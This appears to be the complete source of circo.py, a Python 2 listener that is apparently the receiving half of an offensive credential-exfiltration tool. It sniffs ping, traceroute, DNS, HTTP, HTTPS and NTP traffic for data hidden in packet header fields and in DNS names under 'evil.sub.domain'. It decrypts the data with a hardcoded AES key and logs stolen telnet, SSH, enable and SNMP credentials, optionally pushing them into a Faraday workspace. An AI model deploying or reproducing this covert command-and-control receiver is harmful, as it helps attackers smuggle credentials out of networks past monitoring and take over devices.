#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
circo.py source code
"""
from __future__ import print_function
import sys
import re
import argparse
import time
import threading
import collections
import socket
import ConfigParser
import requests
import pyaes
import pyscrypt
from pyfiglet import Figlet
from scapy.all import Raw, IP, ICMP, TCP, UDP, DNS, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.5"

# Config
PHRASE = 'Waaaaa! awesome :)'
SALT = 'salgruesa'
CCNAME = 'evil.sub.domain'
DEBUG = False
PLUG = False
FSERVER = ''
FUSER = ''
FPASSWD = ''
FWS = ''
FSESSION = False

# Faraday objects (host & credentials)
HOST = {"ip":"",
        "hostnames":[],
        "mac":"00:00:00:00:00:00",
        "description":"",
        "default_gateway":"None",
        "os":"",
        "owned":"false",
        "owner":""
       }

CREDENTIAL = {"name":"",
              "username":"",
              "password":"",
              "type":"Cred",
              "parent_type":"Host",
              "parent":"",
              "owner":"",
              "description":""
             }


# Classes
class PINGHandler(threading.Thread):
    """
    Class to observe PING packets
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0

    def pkt_callback(self, pkt):
        """
        Process PING packets
        """
        if pkt[ICMP].type == 8:
            if pkt[IP].id >= 200 and pkt[IP].id < 300:
                self.pktlen = pkt[IP].id - 200
            elif pkt[IP].id >= 300 and pkt[IP].id < 400:
                self.pkttotal = pkt[IP].id - 300
            elif pkt[IP].id >= 500 and pkt[IP].id < 600:
                self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[ICMP].seq)
            elif pkt[IP].id == 666:
                if DEBUG:
                    print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                          + 'PING:' + pkt[IP].src + ':ALARM Case Open!')

        if len(self.dic) == self.pkttotal:
            odic = collections.OrderedDict(sorted(self.dic.items()))
            final = ''
            for value in odic.iteritems():
                final = final + value[1]
            text = decrypt(final[:self.pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            text = text.replace(hexip, hextoip(hexip))
            text = 'PING:' + pkt[IP].src + ':' + text
            printer(self.filed, text)
            self.dic = {}
            self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, filter="icmp",
                  store=0)

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()


class TraceHandler(threading.Thread):
    """
    Class to observe UDP packets (portrange 33434-33500)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0

    def pkt_callback(self, pkt):
        """
        Process Traceroute packets
        """
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            self.pktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            self.pkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            self.dic[pkt[IP].id - 500] = pkt[Raw].load[28:]
        elif pkt[IP].id == 666:
            if DEBUG:
                print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                      + 'TRACE:' + pkt[IP].src + ':ALARM Case Open!')

        if len(self.dic) == self.pkttotal:
            odic = collections.OrderedDict(sorted(self.dic.items()))
            final = ''
            for value in odic.iteritems():
                final = final + value[1]
            text = decrypt(final[:self.pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            text = text.replace(hexip, hextoip(hexip))
            text = 'TRACE:' + pkt[IP].src + ':' + text
            printer(self.filed, text)
            self.dic = {}
            self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0,
                  filter="(udp and dst portrange 33434-35000) and (not src port 53)")

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()


class DNSHandler(threading.Thread):
    """
    Class to observe DNS packets
    and decrypt credentials
    """
    def __init__(self, iface, fd, ccname):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.ccname = ccname

    def pkt_callback(self, pkt):
        """
        Proccess DNS packets
        """
        if self.ccname in pkt[DNS].qd.qname:
            if pkt[DNS].qd.qname == '666.' + self.ccname + '.':
                print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                      + 'DNS/PDNS:' + pkt[IP].src + ':ALARM Case Open!')
            else:
                text = decrypt(pkt[DNS].qd.qname.split('.')[0])
                text = text.strip()
                hexip = text.split(',')[-1]
                text = text.replace(hexip, hextoip(hexip))
                if pkt[DNS].qd.qtype == 2:
                    text = 'DNS:' + pkt[IP].src + ':' + text
                else:
                    text = 'PDNS:' + pkt[IP].src + ':' + text
                printer(self.filed, text)

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0,
                  filter="udp and dst port 53")

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()


class HTTPHandler(threading.Thread):
    """
    Class to observe HTTP packets (TCP port 80)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0

    def pkt_callback(self, pkt):
        """
        Proccess HTTP packets (direct)
        """
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            self.pktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            self.pkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)
        elif pkt[IP].id == 666:
            print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                  + 'HTTP:' + pkt[IP].src + ':ALARM Case Open!')

        if len(self.dic) == self.pkttotal:
            odic = collections.OrderedDict(sorted(self.dic.items()))
            final = ''
            for value in odic.iteritems():
                final = final + value[1]
            text = decrypt(final[:self.pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            text = text.replace(hexip, hextoip(hexip))
            text = 'HTTP:' + pkt[IP].src + ':' + text
            printer(self.filed, text)
            self.dic = {}
            self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0,
                  filter="tcp and dst port 80")

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()


class HTTPSHandler(threading.Thread):
    """
    Class to observe HTTPS packets (TCP port 443)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0

    def pkt_callback(self, pkt):
        """
        Proccess HTTPS packets
        """
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            self.pktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            self.pkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)
        elif pkt[IP].id == 666:
            print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                  + 'HTTPS:' + pkt[IP].src + ':ALARM Case Open!')

        if len(self.dic) == self.pkttotal:
            odic = collections.OrderedDict(sorted(self.dic.items()))
            final = ''
            for value in odic.iteritems():
                final = final + value[1]
            text = decrypt(final[:self.pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            text = text.replace(hexip, hextoip(hexip))
            text = 'HTTPS:' + pkt[IP].src + ':' + text
            printer(self.filed, text)
            self.dic = {}
            self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0,
                  filter="tcp and dst port 443")

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()


class NTPHandler(threading.Thread):
    """
    Class to observe NTP packets
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.filed = fd
        self.dic = {}
        self.pkttotal = 200
        self.pktlen = 0
        self.ssocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ssocket.bind(('0.0.0.0', 123))

    def run(self):
        while not self.stoprequest.isSet():
            buf, address = self.ssocket.recvfrom(200)
            if buf:
                buflen = len(buf)
                full = buf[buflen-48:buflen].encode('hex')
                if full[2:4] == '10':
                    self.pkttotal = int(full[4:6], 16)
                    self.pktlen = int(full[6:8], 16)
                elif full[2:4] == '00':
                    self.dic[int(full[4:6], 16)] = full[88:96]
                elif full[2:4] == '99':
                    print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                          + 'NTP:' + address[0] + ':ALARM Case Open!')

                if len(self.dic) == self.pkttotal:
                    odic = collections.OrderedDict(sorted(self.dic.items()))
                    final = ''
                    for value in odic.iteritems():
                        final = final + value[1]
                    text = decrypt(final[:self.pktlen])
                    text = text.strip()
                    hexip = text.split(',')[-1]
                    text = text.replace(hexip, hextoip(hexip))
                    text = 'NTP:' + address[0] + ':' + text
                    printer(self.filed, text)
                    self.dic = {}
                    self.pkttotal = 200
                    self.pktlen = 0
            buf = ''

    def killer(self):
        """
        stop Thread
        """
        self.stoprequest.set()

# Define Funtions
def decrypt(ciphertxt):
    """
    Decrypt credentails
    """
    hashed = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt

def hextoip(ipadd):
    """
    convert HEX to IP Dot format
    """
    num = 2
    return '.'.join([str(int(ipadd[i:i+num], 16)) for i in range(0, len(ipadd), num)])

def printer(filed, text):
    """
    Add credentials to output file and Faraday
    """
    if DEBUG:
        print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    find = re.compile('\\b' + text + '\\b')
    with open(filed, 'a+') as sfile:
        with open(filed, 'r') as xfile:
            match = find.findall(xfile.read())
            if not match:
                sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                            + text + '\n')
                if PLUG:
                    faraday(text)

def faraday(txt):
    """
    Push credentials into Faraday Workspace
    """
    global FSESSION
    srcip = txt.split(',')[-1:][0]
    natip = txt.split(':')[1]
    name = txt.split(':')[2].split(',')[0]
    if name == 't' or name == 's':
        username = txt.split(':')[2].split(',')[1]
        name = name.replace('t', 'telnet').replace('s', 'ssh')
        if username == 'e':
            username = 'enable'
        password = txt.split(':')[2].split(',')[2]
    else:
        name = name.replace('p', 'snmp')
        username = 'N/A'
        password = txt.split(':')[2].split(',')[1]
    resp = FSESSION.get(FSERVER + '/_api/v2/ws/' + FWS + '/credential/')
    if resp.status_code == 401:
        FSESSION = flogin()
        resp = FSESSION.get(FSERVER + '/_api/v2/ws/' + FWS + '/credential/')
    if resp.status_code == 200:
        credata = resp.json()
        exist = False
        for credrow in range(len(credata['rows'])):
            _target = credata['rows'][credrow]['value']['target']
            _name = credata['rows'][credrow]['value']['name']
            _user = credata['rows'][credrow]['value']['username']
            _pass = credata['rows'][credrow]['value']['password']
            if _target == srcip and name == _name and username == _user and password == _pass:
                exist = True
                break

        if not exist:
            parent_id = checkhost(FSERVER, FWS, FSESSION, srcip, natip)
            if parent_id:
                CREDENTIAL['parent'] = parent_id
                CREDENTIAL['name'] = name
                CREDENTIAL['username'] = username
                CREDENTIAL['password'] = password
                resp = FSESSION.post(FSERVER + '/_api/v2/ws/' + FWS + '/credential/',
                                     json=CREDENTIAL)
                if resp.status_code != 201:
                    print('ERROR: API Cred insert fail')

def configmap(config, section):
    """
    Plugins config grabber
    """
    dictret = {}
    try:
        options = config.options(section)
    except:
        print('ERROR: can\'t access section', section)
        sys.exit(1)
    for option in options:
        try:
            dictret[option] = config.get(section, option)
            if dictret[option] == -1:
                print('ERROR: skip ', option)
        except:
            print('ERROR: exception on ', option)
            dictret[option] = None
    return dictret

def checkhost(server, works, session, ipadd, natip):
    """
    Check if host exist in Faraday
    """
    resp = session.get(server + '/_api/v2/ws/' + works + '/hosts/')
    if resp.status_code == 200:
        hostdata = resp.json()
        for hostrow in range(len(hostdata['rows'])):
            if ipadd == hostdata['rows'][hostrow]['value']['ip']:
                return int(hostdata['rows'][hostrow]['value']['id'])
        HOST['ip'] = ipadd
        HOST['description'] = 'NAT IP: ' + natip
        resp = session.post(server + '/_api/v2/ws/' + works + '/hosts/', json=HOST)
        if resp.status_code == 201:
            hostdata = resp.json()
            return hostdata['id']
        else:
            print('ERROR: API Host insert fail')
            print(resp.text)
            print(repr(HOST))
    else:
        print('ERROR: API Hosts call fail')
        print(resp.text)
    return None

def valplugin(fplugin):
    """
    Search faraday config
    """
    global FSERVER
    global FUSER
    global FPASSWD
    global FWS
    config = ConfigParser.ConfigParser()
    config.read(fplugin)
    foptions = configmap(config, "Faraday")
    if foptions:
        for key, value in foptions.items():
            if key == 'server' and value != '':
                FSERVER = value
            elif key == 'user' and value != '':
                FUSER = value
            elif key == 'password' and value != '':
                FPASSWD = value
            elif key == 'workspace' and value != '':
                FWS = value
        if not (FSERVER and FUSER and FPASSWD and FWS):
            print('ERROR: option missing/blank in file', fplugin)
            sys.exit(1)

def parsingopt():
    """
    Parsing and help function
    """
    fig = Figlet(font='standard')
    print(fig.renderText('CARPA'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable Debugging')
    parser.add_argument('-p', metavar='<plugin.ini>', dest='pluginfd',
                        help='Plugin File (faraday.ini)')
    parser.add_argument('-i', required=True,
                        metavar='<eth0>', dest='nic', help='Sniff Interface')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output File')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        parser.print_help()
        sys.exit(1)


def flogin():
    """
    Faraday API login
    """
    global FSESSION
    FSESSION = requests.Session()
    app = FSESSION.post(FSERVER + '/_api/login', json={'email': FUSER, 'password': FPASSWD})
    if app.status_code == 200:
        return True
    else:
        FSESSION = False
    return False


# Main Function

def main():
    """
    Main Loop
    """
    global DEBUG
    global PLUG
    options = parsingopt()

    if options.verbose:
        DEBUG = True
        print('Listening.....')

    # Plugin Thread
    if options.pluginfd:
        valplugin(options.pluginfd)
        if flogin():
            if DEBUG:
                print('INFO: Login to Faraday OK')
            PLUG = True
        else:
            print('ERROR: Faraday Login incorrect, skip plugin')

    # PING Thread
    pingdh = PINGHandler(options.nic, options.fd)
    pingdh.daemon = True
    pingdh.start()

    # Traceroute Thread
    tracedh = TraceHandler(options.nic, options.fd)
    tracedh.daemon = True
    tracedh.start()

    # DNS Thread
    dnsdh = DNSHandler(options.nic, options.fd, CCNAME)
    dnsdh.daemon = True
    dnsdh.start()

    # HTTP Thread (direct or via proxy)
    httpdh = HTTPHandler(options.nic, options.fd)
    httpdh.daemon = True
    httpdh.start()

    # HTTPS Thread
    httpsdh = HTTPSHandler(options.nic, options.fd)
    httpsdh.daemon = True
    httpsdh.start()

    # NTP Thread
    ntpdh = NTPHandler(options.nic, options.fd)
    ntpdh.daemon = True
    ntpdh.start()

    # Running loop
    try:
        while True:
            pass
    except KeyboardInterrupt:
        sys.exit(0)

# Call main
if __name__ == '__main__':
    main()
